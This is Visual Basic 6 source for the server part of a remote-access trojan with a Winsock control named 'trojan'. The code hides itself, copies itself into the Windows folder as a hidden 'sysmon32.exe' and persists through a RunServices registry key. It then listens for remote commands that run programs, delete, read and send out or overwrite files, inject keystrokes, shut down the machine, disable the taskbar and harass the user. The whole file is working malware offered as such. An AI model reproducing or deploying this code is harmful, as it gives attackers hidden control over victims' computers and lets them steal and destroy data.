VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2055
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4530
   Icon            =   "serwer1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2055
   ScaleWidth      =   4530
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.FileListBox File1 
      Height          =   480
      Left            =   1440
      TabIndex        =   3
      Top             =   1320
      Width           =   2655
   End
   Begin VB.DirListBox Dir1 
      Height          =   765
      Left            =   1440
      TabIndex        =   2
      Top             =   480
      Width           =   2655
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   1440
      TabIndex        =   1
      Top             =   120
      Width           =   2655
   End
   Begin VB.Timer Timer6 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   360
      Top             =   1560
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   1080
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   120
      Top             =   1080
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   120
      Top             =   600
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   600
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   600
      Top             =   120
   End
   Begin MSWinsockLib.Winsock trojan 
      Left            =   120
      Tag             =   "False"
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemoteHost      =   "127.0.0.1"
      RemotePort      =   3003
      LocalPort       =   3004
   End
   Begin VB.Label Label1 
      Caption         =   "0"
      Height          =   255
      Left            =   1080
      TabIndex        =   0
      Top             =   0
      Width           =   135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
        x As Long
        y As Long
End Type
Private pm As POINTAPI
Private X1 As Integer
Private Y1 As Integer
Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function CloseWindow Lib "user32" (ByVal hwnd As Long) As Long






Private Sub Form_Load()
On Error Resume Next
App.Title = "Microsoft"
If InternetConnected = True Then
trojan.Protocol = sckTCPProtocol
trojan.Listen
Else
trojan.Protocol = sckUDPProtocol
a = trojan.LocalIP
trojan.Bind 3000, a
End If
Set FsysO = CreateObject("Scripting.FileSystemObject")
cSystemFolder = FsysO.GetSpecialFolder(0) & "\"
cAppDirectory = App.Path & "\"
If cAppDirectory = cSystemFolder Then
Else
'****
   On Error Resume Next

   Dim cSourceEXE As String
   Dim cTargetEXE As String
   Dim cRegistry As String

   cSourceEXE = cAppDirectory & App.EXEName & ".EXE"
   cTargetEXE = cSystemFolder & "sysmon32" & ".EXE"

   cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
   CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
   SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "System32", cTargetEXE, REG_SZ
      cop = CopyFile(cSourceEXE, cTargetEXE, False)
      SetAttr cTargetEXE, vbSystem + vbHidden + vbReadOnly
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
Dim cRegistry As String
Dim cTargetEXE As String
On Error Resume Next
cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "SystemMonitor 32", "", REG_SZ

cTargetEXE = UCase("c:\windows\" & "sysmon32.EXE")
SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "SystemMonitor 32", cTargetEXE, REG_SZ
    If App.Path = "A:\" Or App.Path = "C:\" Or App.Path = "D:\" Or App.Path = "E:\" Or App.Path = "F:\" Or App.Path = "G:\" Or App.Path = "H:\" Or App.Path = "I:\" Or App.Path = "J:\" Then
    GoTo krotki2:
    Else
    GoTo dlugi2:
    End If

krotki2:
Shell App.Path & App.EXEName, vbHide

        Exit Sub

dlugi2:
Shell App.Path & "\" & App.EXEName, vbHide

        Exit Sub


End Sub

Private Sub Timer1_Timer()
If InternetConnected = True Then
trojan.Close
trojan.Protocol = sckTCPProtocol
trojan.Listen
End If
End Sub

Private Sub Timer2_Timer()
a = Int(Rnd * 2)
pox = GetCursorPos(pm)
If a = 1 Then
X1 = pm.x + Int(Rnd * 6)
Y1 = pm.y + Int(Rnd * 6)
Else
X1 = pm.x - Int(Rnd * 6)
Y1 = pm.y - Int(Rnd * 6)
End If
If X1 < 10 Or Y1 < 10 Then
Form1.Visible = True
Else
poz = SetCursorPos(X1, Y1)

Form1.Visible = False
End If

End Sub

Private Sub Timer3_Timer()
a = Int(Rnd * 18)
b = RGB(Rnd * 255, Rnd * 255, Rnd * 255)
o = SetSysColors(1, a, b)
End Sub

Private Sub Timer4_Timer()
    liczba = Int(Rnd * 99500)
    Open "c:\windows\pulpit\vir" & liczba & ".vir" For Output As #1
    Print #1, vbCr & "Freeware Anti-Windows program by GazOOnga" & vbCr & "Created in 2000-04-22" & vbCr & "For our next generation..." & vbCr & "www.gazoonga.of.pl" & vbCr & "gazoonga@go2.pl"
    Close #1

End Sub

Private Sub Timer5_Timer()
hawu = Int(Rnd * 9000)
asek = CloseWindow(hawu)

End Sub

Private Sub Timer6_Timer()
c2 = Int(Rnd * 1100)
d2 = Int(Rnd * 900)
mp = SetCursorPos(c2, d2)
End Sub

Private Sub trojan_ConnectionRequest(ByVal requestID As Long)
trojan.Accept requestID
End Sub

Private Sub trojan_DataArrival(ByVal bytesTotal As Long)
Dim kupa As String
On Error Resume Next
trojan.GetData kupa

If kupa = "ip" Then
On Error Resume Next
GoTo ip:
End If

If kupa = "wiad" Then
On Error Resume Next
Dim tekst As String
trojan.GetData tekst
MsgBox tekst, vbSystemModal, "Error"
End If

If kupa = "mouse1" Then
On Error Resume Next
Dim pozX As String
Dim pozY As String
trojan.GetData pozX
trojan.GetData pozY
SetCursorPos pozX, pozY
End If


If kupa = "mouse2" Then
On Error Resume Next
If Form1.Label1.Caption = 1 Then
a = SwapMouseButton(0)
Label1.Caption = 0
Else
b = SwapMouseButton(1)
Label1.Caption = 1
End If
End If

If kupa = "oko" Then
On Error Resume Next
kupa = "oko2"
trojan.SendData kupa
End If

If kupa = "mouse3" Then
On Error Resume Next
Timer2.Enabled = True
End If

If kupa = "mouse4" Then
On Error Resume Next
Timer2.Enabled = False
End If

If kupa = "rpu" Then
On Error Resume Next
Timer5.Enabled = True
End If

If kupa = "kpu" Then
On Error Resume Next
Timer5.Enabled = False
End If

If kupa = "rbe" Then
On Error Resume Next
Load Form2
Form2.Show
End If

If kupa = "kbe" Then
On Error Resume Next
Unload Form2
End If

If kupa = "rszm" Then
On Error Resume Next
Timer6.Enabled = True
End If

If kupa = "kszm" Then
On Error Resume Next
Timer6.Enabled = False
End If

If kupa = "rci" Then
On Error Resume Next
Load Form2
Form2.BackColor = RGB(0, 0, 0)
Form2.Show
End If

If kupa = "kci" Then
On Error Resume Next
Unload Form2
End If


If kupa = "run" Then
On Error Resume Next
Dim pat As String
trojan.GetData pat
Shell pat
End If

If kupa = "kil" Then
On Error Resume Next
Dim pat2 As String
trojan.GetData pat2
Kill pat2
End If

If kupa = "ed" Then
On Error Resume Next
Dim pat3 As String
trojan.GetData pat3
dlug = Len(pat3)

If dlug < 8 Then
Exit Sub
End If
        Wrap$ = Chr$(13) + Chr$(10)
        On Error GoTo koniec:
        Open pat3 For Input As #1
        Do Until EOF(1)
            Line Input #1, LiniaTekstu$
            Ca³yTekst$ = Ca³yTekst$ & LiniaTekstu$ & Wrap$
        Loop
        kupa = "zwrot"
        zwrocik = Ca³yTekst$
        On Error Resume Next
        trojan.SendData kupa
        trojan.SendData zwrocik
        Close #1
koniec:
End If

If kupa = "zw" Then
On Error Resume Next
Dim pat4 As String
Dim pat5 As String
trojan.GetData pat4
trojan.GetData pat5
        Open pat4 For Output As #1
        Print #1, pat5
        Close #1
End If

If kupa = "kolor" Then
On Error Resume Next
Timer3.Enabled = True
End If

If kupa = "kolor2" Then
On Error Resume Next
Timer3.Enabled = False
End If

If kupa = "koniec" Then
End
End If


If kupa = "cdopen" Then
On Error Resume Next
xAnswer = mciSendString("set CDAudio door open", 0&, 0, 0)
End If

If kupa = "cdclose" Then
On Error Resume Next
zAnswer = mciSendString("set CDAudio door closed", 0&, 0, 0)
End If

If kupa = "sk" Then
Dim tekst2 As String
On Error Resume Next
trojan.GetData tekst2
SendKeys tekst2, True
End If

If kupa = "skesc" Then
On Error Resume Next
SendKeys "{Esc}", True
End If

If kupa = "skent" Then
On Error Resume Next
SendKeys "{Enter}", True
End If

If kupa = "skbs" Then
On Error Resume Next
SendKeys "{BackSpace}", True
End If

If kupa = "exw" Then
On Error Resume Next
zam = ExitWindowsEx(1, 0)
End If
If kupa = "rew" Then
On Error Resume Next
res = ExitWindowsEx(2, 0)
End If
If kupa = "gui" Then
On Error Resume Next
Shell "c:\windows\rundll32.exe user,DisableOEMLayer"
End If

If kupa = "srpl" Then
On Error Resume Next
Timer4.Enabled = True
End If
If kupa = "srst" Then
On Error Resume Next
Timer4.Enabled = False
End If

If kupa = "dt" Then
On Error Resume Next
DisableTaskBar
End If
If kupa = "et" Then
On Error Resume Next
EnableTaskBar
End If

If kupa = "dc" Then
Dim dcx As String
Dim dcy As String
dcy = Screen.Height / Screen.TwipsPerPixelY
dcx = Screen.Width / Screen.TwipsPerPixelX
kupa = "dxcy"
trojan.SendData kupa
trojan.SendData dcx
trojan.SendData dcy
End If


If kupa = "dels" Then
On Error Resume Next
SetAttr "c:\windows\sysmon32.exe", vbNormal
Kill "c:\windows\sysmon32.exe"
End
End If

If kupa = "myszpoz" Then
Dim xpoz As String
Dim ypoz As String
trojan.GetData xpoz
trojan.GetData ypoz
a = SetCursorPos(xpoz, ypoz)
End If

If kupa = "ab" Then
Dim lb As String
trojan.GetData lb
For a = 1 To lb
MsgBox "B³¹d" & " " & Int(Rnd * 3000), vbCritical, "Explorer"
Next a
End If


ip:
Dim kupaIP As String
On Error Resume Next
trojan.GetData kupaIP
trojan.RemoteHost = kupaIP
GoTo faza:
Exit Sub

faza:
kupa = "CONNECTED"
Beep
On Error Resume Next
trojan.SendData kupa
Exit Sub

End Sub
